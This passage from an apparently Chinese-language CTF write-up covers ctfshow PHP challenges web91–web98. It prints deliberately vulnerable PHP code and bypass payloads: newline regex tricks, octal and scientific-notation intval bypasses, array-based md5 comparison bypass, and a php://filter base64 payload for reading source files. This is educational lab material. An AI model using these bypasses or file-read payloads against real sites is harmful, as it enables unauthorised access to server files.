</span></span></span><span class="line"><span class="ln">10</span><span class="cl"><span class="cm">
</span></span></span><span class="line"><span class="ln">11</span><span class="cl"><span class="cm">*/</span>
</span></span><span class="line"><span class="ln">12</span><span class="cl">
</span></span><span class="line"><span class="ln">13</span><span class="cl"><span class="nx">show_source</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">14</span><span class="cl"><span class="k">include</span><span class="p">(</span><span class="s1">&#39;flag.php&#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">15</span><span class="cl"><span class="nv">$a</span><span class="o">=</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;cmd&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="ln">16</span><span class="cl"><span class="k">if</span><span class="p">(</span><span class="nx">preg_match</span><span class="p">(</span><span class="s1">&#39;/^php$/im&#39;</span><span class="p">,</span> <span class="nv">$a</span><span class="p">)){</span>
</span></span><span class="line"><span class="ln">17</span><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="nx">preg_match</span><span class="p">(</span><span class="s1">&#39;/^php$/i&#39;</span><span class="p">,</span> <span class="nv">$a</span><span class="p">)){</span>
</span></span><span class="line"><span class="ln">18</span><span class="cl">        <span class="k">echo</span> <span class="s1">&#39;hacker&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">19</span><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="ln">20</span><span class="cl">    <span class="k">else</span><span class="p">{</span>
</span></span><span class="line"><span class="ln">21</span><span class="cl">        <span class="k">echo</span> <span class="nv">$flag</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">22</span><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="ln">23</span><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="ln">24</span><span class="cl"><span class="k">else</span><span class="p">{</span>
</span></span><span class="line"><span class="ln">25</span><span class="cl">    <span class="k">echo</span> <span class="s1">&#39;nonononono&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">26</span><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><p>这题考察的是一个正则表达式的理解和绕过</p>
<p>这两个正则表达式都是用来匹配字符串php的</p>
<blockquote>
<h5 id="phpim-的含义"><code>/^php$/im</code> 的含义<a hidden class="anchor" aria-hidden="true" href="#phpim-的含义">#</a></h5>
<ul>
<li><code>^</code>：表示字符串的开始。</li>
<li><code>php</code>：表示匹配字符 <code>php</code>。</li>
<li><code>$</code>：表示字符串的结束。</li>
<li><code>i</code>：表示不区分大小写。</li>
<li><code>m</code>：表示多行模式（multi-line）。</li>
</ul></blockquote>
<p>要得到flag，我们需要让第一个判断为true，第二个判断为false</p>
<p>而第二个正则表达式与正则表达式一的区别在于他没有进行多行匹配</p>
<p>那我们只需要通过换行符就可以实现绕过</p>
<p>payload:</p>
<pre tabindex="0"><code>cmd=%oaphp
</code></pre><h4 id="web92">web92<a hidden class="anchor" aria-hidden="true" href="#web92">#</a></h4>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="ln"> 2</span><span class="cl">
</span></span><span class="line"><span class="ln"> 3</span><span class="cl"><span class="cm">/*
</span></span></span><span class="line"><span class="ln"> 4</span><span class="cl"><span class="cm"># -*- coding: utf-8 -*-
</span></span></span><span class="line"><span class="ln"> 5</span><span class="cl"><span class="cm"># @Author: Firebasky
</span></span></span><span class="line"><span class="ln"> 6</span><span class="cl"><span class="cm"># @Date:   2020-09-16 11:25:09
</span></span></span><span class="line"><span class="ln"> 7</span><span class="cl"><span class="cm"># @Last Modified by:   h1xa
</span></span></span><span class="line"><span class="ln"> 8</span><span class="cl"><span class="cm"># @Last Modified time: 2020-09-18 16:29:30
</span></span></span><span class="line"><span class="ln"> 9</span><span class="cl"><span class="cm"># @link: https://ctfer.com
</span></span></span><span class="line"><span class="ln">10</span><span class="cl"><span class="cm">
</span></span></span><span class="line"><span class="ln">11</span><span class="cl"><span class="cm">*/</span>
</span></span><span class="line"><span class="ln">12</span><span class="cl">
</span></span><span class="line"><span class="ln">13</span><span class="cl"><span class="k">include</span><span class="p">(</span><span class="s2">&#34;flag.php&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">14</span><span class="cl"><span class="nx">highlight_file</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">15</span><span class="cl"><span class="k">if</span><span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;num&#39;</span><span class="p">])){</span>
</span></span><span class="line"><span class="ln">16</span><span class="cl">    <span class="nv">$num</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;num&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="ln">17</span><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="nv">$num</span><span class="o">==</span><span class="mi">4476</span><span class="p">){</span>
</span></span><span class="line"><span class="ln">18</span><span class="cl">        <span class="k">die</span><span class="p">(</span><span class="s2">&#34;no no no!&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">19</span><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="ln">20</span><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="nx">intval</span><span class="p">(</span><span class="nv">$num</span><span class="p">,</span><span class="mi">0</span><span class="p">)</span><span class="o">==</span><span class="mi">4476</span><span class="p">){</span>
</span></span><span class="line"><span class="ln">21</span><span class="cl">        <span class="k">echo</span> <span class="nv">$flag</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">22</span><span class="cl">    <span class="p">}</span><span class="k">else</span><span class="p">{</span>
</span></span><span class="line"><span class="ln">23</span><span class="cl">        <span class="k">echo</span> <span class="nx">intval</span><span class="p">(</span><span class="nv">$num</span><span class="p">,</span><span class="mi">0</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">24</span><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="ln">25</span><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><p>这题与90题的区别就在于这里进行的是弱类型的比较</p>
<p>在弱类型的比较里面我们不能通过增加字母的方式绕过，如下</p>
<pre tabindex="0"><code>&#34;123aa&#34; == 123
&#34;123aa&#34; === 123aa
</code></pre><p>我们可以通过其它方法来绕过</p>
<p>如通过intval函数的特性，我们可以通过输入转换成其他进制的4476来进行绕过（前面说过当base=0时会自动进行进制的转换）。</p>
<p>payload：</p>
<pre tabindex="0"><code>HEX: 0x117c //十进制前面补0x
OCT: 010574 //八进制前面补0
</code></pre><p>或者</p>
<p>官方题解</p>
<blockquote>
<p>intval()函数如果$base为0则$var中存在字母的话遇到字母就停止读取,但是e这个字母比较特殊，可以在PHP中不是科学计数法。所以为了绕过前面的==4476，我们就可以构造 4476e123</p></blockquote>
<h4 id="web93">web93<a hidden class="anchor" aria-hidden="true" href="#web93">#</a></h4>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="ln"> 2</span><span class="cl">
</span></span><span class="line"><span class="ln"> 3</span><span class="cl"><span class="cm">/*
</span></span></span><span class="line"><span class="ln"> 4</span><span class="cl"><span class="cm"># -*- coding: utf-8 -*-
</span></span></span><span class="line"><span class="ln"> 5</span><span class="cl"><span class="cm"># @Author: Firebasky
</span></span></span><span class="line"><span class="ln"> 6</span><span class="cl"><span class="cm"># @Date:   2020-09-16 11:25:09
</span></span></span><span class="line"><span class="ln"> 7</span><span class="cl"><span class="cm"># @Last Modified by:   h1xa
</span></span></span><span class="line"><span class="ln"> 8</span><span class="cl"><span class="cm"># @Last Modified time: 2020-09-18 16:32:58
</span></span></span><span class="line"><span class="ln"> 9</span><span class="cl"><span class="cm"># @link: https://ctfer.com
</span></span></span><span class="line"><span class="ln">10</span><span class="cl"><span class="cm">
</span></span></span><span class="line"><span class="ln">11</span><span class="cl"><span class="cm">*/</span>
</span></span><span class="line"><span class="ln">12</span><span class="cl">
</span></span><span class="line"><span class="ln">13</span><span class="cl"><span class="k">include</span><span class="p">(</span><span class="s2">&#34;flag.php&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">14</span><span class="cl"><span class="nx">highlight_file</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">15</span><span class="cl"><span class="k">if</span><span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;num&#39;</span><span class="p">])){</span>
</span></span><span class="line"><span class="ln">16</span><span class="cl">    <span class="nv">$num</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;num&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="ln">17</span><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="nv">$num</span><span class="o">==</span><span class="mi">4476</span><span class="p">){</span>
</span></span><span class="line"><span class="ln">18</span><span class="cl">        <span class="k">die</span><span class="p">(</span><span class="s2">&#34;no no no!&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">19</span><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="ln">20</span><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="nx">preg_match</span><span class="p">(</span><span class="s2">&#34;/[a-z]/i&#34;</span><span class="p">,</span> <span class="nv">$num</span><span class="p">)){</span>
</span></span><span class="line"><span class="ln">21</span><span class="cl">        <span class="k">die</span><span class="p">(</span><span class="s2">&#34;no no no!&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">22</span><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="ln">23</span><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="nx">intval</span><span class="p">(</span><span class="nv">$num</span><span class="p">,</span><span class="mi">0</span><span class="p">)</span><span class="o">==</span><span class="mi">4476</span><span class="p">){</span>
</span></span><span class="line"><span class="ln">24</span><span class="cl">        <span class="k">echo</span> <span class="nv">$flag</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">25</span><span class="cl">    <span class="p">}</span><span class="k">else</span><span class="p">{</span>
</span></span><span class="line"><span class="ln">26</span><span class="cl">        <span class="k">echo</span> <span class="nx">intval</span><span class="p">(</span><span class="nv">$num</span><span class="p">,</span><span class="mi">0</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">27</span><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="ln">28</span><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><pre tabindex="0"><code>preg_match(&#34;/[a-z]/i&#34;, $num)
</code></pre><p>相比上一题这题增加了一个字母的匹配，让我们不能用上一题e绕过的方法和十六进制绕过的方法</p>
<p>但是八进制绕过依旧是可行的，因为他不包含字母</p>
<p>payload:</p>
<pre tabindex="0"><code>num=010574
</code></pre><h4 id="web94">web94<a hidden class="anchor" aria-hidden="true" href="#web94">#</a></h4>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="ln"> 2</span><span class="cl">
</span></span><span class="line"><span class="ln"> 3</span><span class="cl"><span class="cm">/*
</span></span></span><span class="line"><span class="ln"> 4</span><span class="cl"><span class="cm"># -*- coding: utf-8 -*-
</span></span></span><span class="line"><span class="ln"> 5</span><span class="cl"><span class="cm"># @Author: h1xa
</span></span></span><span class="line"><span class="ln"> 6</span><span class="cl"><span class="cm"># @Date:   2020-09-16 11:25:09
</span></span></span><span class="line"><span class="ln"> 7</span><span class="cl"><span class="cm"># @Last Modified by:   h1xa
</span></span></span><span class="line"><span class="ln"> 8</span><span class="cl"><span class="cm"># @Last Modified time: 2020-09-18 16:46:19
</span></span></span><span class="line"><span class="ln"> 9</span><span class="cl"><span class="cm"># @link: https://ctfer.com
</span></span></span><span class="line"><span class="ln">10</span><span class="cl"><span class="cm">
</span></span></span><span class="line"><span class="ln">11</span><span class="cl"><span class="cm">*/</span>
</span></span><span class="line"><span class="ln">12</span><span class="cl">
</span></span><span class="line"><span class="ln">13</span><span class="cl"><span class="k">include</span><span class="p">(</span><span class="s2">&#34;flag.php&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">14</span><span class="cl"><span class="nx">highlight_file</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">15</span><span class="cl"><span class="k">if</span><span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;num&#39;</span><span class="p">])){</span>
</span></span><span class="line"><span class="ln">16</span><span class="cl">    <span class="nv">$num</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;num&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="ln">17</span><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="nv">$num</span><span class="o">===</span><span class="s2">&#34;4476&#34;</span><span class="p">){</span>
</span></span><span class="line"><span class="ln">18</span><span class="cl">        <span class="k">die</span><span class="p">(</span><span class="s2">&#34;no no no!&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">19</span><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="ln">20</span><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="nx">preg_match</span><span class="p">(</span><span class="s2">&#34;/[a-z]/i&#34;</span><span class="p">,</span> <span class="nv">$num</span><span class="p">)){</span>
</span></span><span class="line"><span class="ln">21</span><span class="cl">        <span class="k">die</span><span class="p">(</span><span class="s2">&#34;no no no!&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">22</span><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="ln">23</span><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nx">strpos</span><span class="p">(</span><span class="nv">$num</span><span class="p">,</span> <span class="s2">&#34;0&#34;</span><span class="p">)){</span>
</span></span><span class="line"><span class="ln">24</span><span class="cl">        <span class="k">die</span><span class="p">(</span><span class="s2">&#34;no no no!&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">25</span><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="ln">26</span><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="nx">intval</span><span class="p">(</span><span class="nv">$num</span><span class="p">,</span><span class="mi">0</span><span class="p">)</span><span class="o">===</span><span class="mi">4476</span><span class="p">){</span>
</span></span><span class="line"><span class="ln">27</span><span class="cl">        <span class="k">echo</span> <span class="nv">$flag</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">28</span><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="ln">29</span><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><pre tabindex="0"><code>!strpos($num, &#34;0&#34;)
</code></pre><p>这题增加了一个条件，同时判断也变成了强判定，这里的<code>strpos()</code>函数用于查找字符串在另一个字符串中首次出现的位置。</p>
<p>也就是这里我们需要让首位不等于0才能使这个判断为false</p>
<h5 id="strops函数绕过">strops函数绕过：<a hidden class="anchor" aria-hidden="true" href="#strops函数绕过">#</a></h5>
<blockquote>
<p>对于strpos()函数，我们可以利用换行进行绕过（%0a）
payload:?num=%0a010574
也可以小数点绕过
payload：?num=4476.0
因为intval()函数只读取整数部分
还可以八进制绕过(%20是空格的url编码形式)
payload：?num=%20010574
?num= 010574 // 前面加个空格
?num=+010574
?num=+4476.0</p></blockquote>
<p>我们选用其中一个绕过方法即可</p>
<p>如空格绕过</p>
<pre tabindex="0"><code>?num=%20010574
</code></pre><p>这题因为用的是强判定也可以用这种方法</p>
<pre tabindex="0"><code>?num=4476.0
</code></pre><p>这种方法就是使其变为浮点型从而使强判定为false，绕过第一个判定</p>
<h4 id="web95">web95<a hidden class="anchor" aria-hidden="true" href="#web95">#</a></h4>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="ln"> 2</span><span class="cl">
</span></span><span class="line"><span class="ln"> 3</span><span class="cl"><span class="cm">/*
</span></span></span><span class="line"><span class="ln"> 4</span><span class="cl"><span class="cm"># -*- coding: utf-8 -*-
</span></span></span><span class="line"><span class="ln"> 5</span><span class="cl"><span class="cm"># @Author: h1xa
</span></span></span><span class="line"><span class="ln"> 6</span><span class="cl"><span class="cm"># @Date:   2020-09-16 11:25:09
</span></span></span><span class="line"><span class="ln"> 7</span><span class="cl"><span class="cm"># @Last Modified by:   h1xa
</span></span></span><span class="line"><span class="ln"> 8</span><span class="cl"><span class="cm"># @Last Modified time: 2020-09-18 16:53:59
</span></span></span><span class="line"><span class="ln"> 9</span><span class="cl"><span class="cm"># @link: https://ctfer.com
</span></span></span><span class="line"><span class="ln">10</span><span class="cl"><span class="cm">
</span></span></span><span class="line"><span class="ln">11</span><span class="cl"><span class="cm">*/</span>
</span></span><span class="line"><span class="ln">12</span><span class="cl">
</span></span><span class="line"><span class="ln">13</span><span class="cl"><span class="k">include</span><span class="p">(</span><span class="s2">&#34;flag.php&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">14</span><span class="cl"><span class="nx">highlight_file</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">15</span><span class="cl"><span class="k">if</span><span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;num&#39;</span><span class="p">])){</span>
</span></span><span class="line"><span class="ln">16</span><span class="cl">    <span class="nv">$num</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;num&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="ln">17</span><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="nv">$num</span><span class="o">==</span><span class="mi">4476</span><span class="p">){</span>
</span></span><span class="line"><span class="ln">18</span><span class="cl">        <span class="k">die</span><span class="p">(</span><span class="s2">&#34;no no no!&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">19</span><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="ln">20</span><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="nx">preg_match</span><span class="p">(</span><span class="s2">&#34;/[a-z]|\./i&#34;</span><span class="p">,</span> <span class="nv">$num</span><span class="p">)){</span>
</span></span><span class="line"><span class="ln">21</span><span class="cl">        <span class="k">die</span><span class="p">(</span><span class="s2">&#34;no no no!!&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">22</span><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="ln">23</span><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nx">strpos</span><span class="p">(</span><span class="nv">$num</span><span class="p">,</span> <span class="s2">&#34;0&#34;</span><span class="p">)){</span>
</span></span><span class="line"><span class="ln">24</span><span class="cl">        <span class="k">die</span><span class="p">(</span><span class="s2">&#34;no no no!!!&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">25</span><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="ln">26</span><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="nx">intval</span><span class="p">(</span><span class="nv">$num</span><span class="p">,</span><span class="mi">0</span><span class="p">)</span><span class="o">===</span><span class="mi">4476</span><span class="p">){</span>
</span></span><span class="line"><span class="ln">27</span><span class="cl">        <span class="k">echo</span> <span class="nv">$flag</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">28</span><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="ln">29</span><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><p>这题和上一题的区别就是改为了弱判定</p>
<p>所以上一题的方法二就用不了了，我们用方法一即可</p>
<p>payload:</p>
<pre tabindex="0"><code>?num=%20010574
</code></pre><h4 id="web96">web96<a hidden class="anchor" aria-hidden="true" href="#web96">#</a></h4>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="ln"> 2</span><span class="cl">
</span></span><span class="line"><span class="ln"> 3</span><span class="cl"><span class="cm">/*
</span></span></span><span class="line"><span class="ln"> 4</span><span class="cl"><span class="cm"># -*- coding: utf-8 -*-
</span></span></span><span class="line"><span class="ln"> 5</span><span class="cl"><span class="cm"># @Author: h1xa
</span></span></span><span class="line"><span class="ln"> 6</span><span class="cl"><span class="cm"># @Date:   2020-09-16 11:25:09
</span></span></span><span class="line"><span class="ln"> 7</span><span class="cl"><span class="cm"># @Last Modified by:   h1xa
</span></span></span><span class="line"><span class="ln"> 8</span><span class="cl"><span class="cm"># @Last Modified time: 2020-09-18 19:21:24
</span></span></span><span class="line"><span class="ln"> 9</span><span class="cl"><span class="cm"># @link: https://ctfer.com
</span></span></span><span class="line"><span class="ln">10</span><span class="cl"><span class="cm">
</span></span></span><span class="line"><span class="ln">11</span><span class="cl"><span class="cm">*/</span>
</span></span><span class="line"><span class="ln">12</span><span class="cl">
</span></span><span class="line"><span class="ln">13</span><span class="cl">
</span></span><span class="line"><span class="ln">14</span><span class="cl"><span class="nx">highlight_file</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">15</span><span class="cl">
</span></span><span class="line"><span class="ln">16</span><span class="cl"><span class="k">if</span><span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;u&#39;</span><span class="p">])){</span>
</span></span><span class="line"><span class="ln">17</span><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;u&#39;</span><span class="p">]</span><span class="o">==</span><span class="s1">&#39;flag.php&#39;</span><span class="p">){</span>
</span></span><span class="line"><span class="ln">18</span><span class="cl">        <span class="k">die</span><span class="p">(</span><span class="s2">&#34;no no no&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">19</span><span class="cl">    <span class="p">}</span><span class="k">else</span><span class="p">{</span>
</span></span><span class="line"><span class="ln">20</span><span class="cl">        <span class="nx">highlight_file</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;u&#39;</span><span class="p">]);</span>
</span></span><span class="line"><span class="ln">21</span><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="ln">22</span><span class="cl">
</span></span><span class="line"><span class="ln">23</span><span class="cl">
</span></span><span class="line"><span class="ln">24</span><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><p>我们知道./指的的是当前目录，所以直接用./绕过即可，不影响文件读取</p>
<p>payload:</p>
<pre tabindex="0"><code>?u=./flag.php
</code></pre><p>or</p>
<pre tabindex="0"><code>u=/var/www/html/flag.php
?u=php://filter/read=convert.base64-encode/resource=flag.php
</code></pre><h4 id="web97">web97<a hidden class="anchor" aria-hidden="true" href="#web97">#</a></h4>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="ln"> 2</span><span class="cl">
</span></span><span class="line"><span class="ln"> 3</span><span class="cl"><span class="cm">/*
</span></span></span><span class="line"><span class="ln"> 4</span><span class="cl"><span class="cm"># -*- coding: utf-8 -*-
</span></span></span><span class="line"><span class="ln"> 5</span><span class="cl"><span class="cm"># @Author: h1xa
</span></span></span><span class="line"><span class="ln"> 6</span><span class="cl"><span class="cm"># @Date:   2020-09-16 11:25:09
</span></span></span><span class="line"><span class="ln"> 7</span><span class="cl"><span class="cm"># @Last Modified by:   h1xa
</span></span></span><span class="line"><span class="ln"> 8</span><span class="cl"><span class="cm"># @Last Modified time: 2020-09-18 19:36:32
</span></span></span><span class="line"><span class="ln"> 9</span><span class="cl"><span class="cm"># @link: https://ctfer.com
</span></span></span><span class="line"><span class="ln">10</span><span class="cl"><span class="cm">
</span></span></span><span class="line"><span class="ln">11</span><span class="cl"><span class="cm">*/</span>
</span></span><span class="line"><span class="ln">12</span><span class="cl">
</span></span><span class="line"><span class="ln">13</span><span class="cl"><span class="k">include</span><span class="p">(</span><span class="s2">&#34;flag.php&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">14</span><span class="cl"><span class="nx">highlight_file</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">15</span><span class="cl"><span class="k">if</span> <span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;a&#39;</span><span class="p">])</span> <span class="k">and</span> <span class="nx">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;b&#39;</span><span class="p">]))</span> <span class="p">{</span>
</span></span><span class="line"><span class="ln">16</span><span class="cl"><span class="k">if</span> <span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;a&#39;</span><span class="p">]</span> <span class="o">!=</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;b&#39;</span><span class="p">])</span>
</span></span><span class="line"><span class="ln">17</span><span class="cl"><span class="k">if</span> <span class="p">(</span><span class="nx">md5</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;a&#39;</span><span class="p">])</span> <span class="o">===</span> <span class="nx">md5</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;b&#39;</span><span class="p">]))</span>
</span></span><span class="line"><span class="ln">18</span><span class="cl"><span class="k">echo</span> <span class="nv">$flag</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">19</span><span class="cl"><span class="k">else</span>
</span></span><span class="line"><span class="ln">20</span><span class="cl"><span class="k">print</span> <span class="s1">&#39;Wrong.&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">21</span><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="ln">22</span><span class="cl"><span class="cp">?&gt;</span><span class="err">
</span></span></span></code></pre></div><p>这是一道md5强比较的题目，绕过姿势挺多</p>
<p>我们可以通过简单的数组绕过</p>
<pre tabindex="0"><code>a[]=1&amp;b[]=2
</code></pre><p>虽然会报错但是能拿到flag</p>
<p><img alt="image-20241130204752518" loading="lazy" src="assets/image-20241130204752518.png"></p>
<h4 id="web98">web98<a hidden class="anchor" aria-hidden="true" href="#web98">#</a></h4>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="ln"> 2</span><span class="cl">
</span></span><span class="line"><span class="ln"> 3</span><span class="cl"><span class="cm">/*
</span></span></span><span class="line"><span class="ln"> 4</span><span class="cl"><span class="cm"># -*- coding: utf-8 -*-
</span></span></span><span class="line"><span class="ln"> 5</span><span class="cl"><span class="cm"># @Author: h1xa
</span></span></span><span class="line"><span class="ln"> 6</span><span class="cl"><span class="cm"># @Date:   2020-09-16 11:25:09
</span></span></span><span class="line"><span class="ln"> 7</span><span class="cl"><span class="cm"># @Last Modified by:   h1xa
</span></span></span><span class="line"><span class="ln"> 8</span><span class="cl"><span class="cm"># @Last Modified time: 2020-09-18 21:39:27
</span></span></span><span class="line"><span class="ln"> 9</span><span class="cl"><span class="cm"># @link: https://ctfer.com
</span></span></span><span class="line"><span class="ln">10</span><span class="cl"><span class="cm">
</span></span></span><span class="line"><span class="ln">11</span><span class="cl"><span class="cm">*/</span>
</span></span><span class="line"><span class="ln">12</span><span class="cl">
</span></span><span class="line"><span class="ln">13</span><span class="cl"><span class="k">include</span><span class="p">(</span><span class="s2">&#34;flag.php&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">14</span><span class="cl"><span class="nv">$_GET</span><span class="o">?</span><span class="nv">$_GET</span><span class="o">=&amp;</span><span class="nv">$_POST</span><span class="o">:</span><span class="s1">&#39;flag&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">15</span><span class="cl"><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;flag&#39;</span><span class="p">]</span><span class="o">==</span><span class="s1">&#39;flag&#39;</span><span class="o">?</span><span class="nv">$_GET</span><span class="o">=&amp;</span><span class="nv">$_COOKIE</span><span class="o">:</span><span class="s1">&#39;flag&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">16</span><span class="cl"><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;flag&#39;</span><span class="p">]</span><span class="o">==</span><span class="s1">&#39;flag&#39;</span><span class="o">?</span><span class="nv">$_GET</span><span class="o">=&amp;</span><span class="nv">$_SERVER</span><span class="o">:</span><span class="s1">&#39;flag&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">17</span><span class="cl"><span class="nx">highlight_file</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;HTTP_FLAG&#39;</span><span class="p">]</span><span class="o">==</span><span class="s1">&#39;flag&#39;</span><span class="o">?</span><span class="nv">$flag</span><span class="o">:</span><span class="no">__FILE__</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">18</span><span class="cl">
</span></span><span class="line"><span class="ln">19</span><span class="cl"><span class="cp">?&gt;</span><span class="err">
</span></span></span></code></pre></div><blockquote>
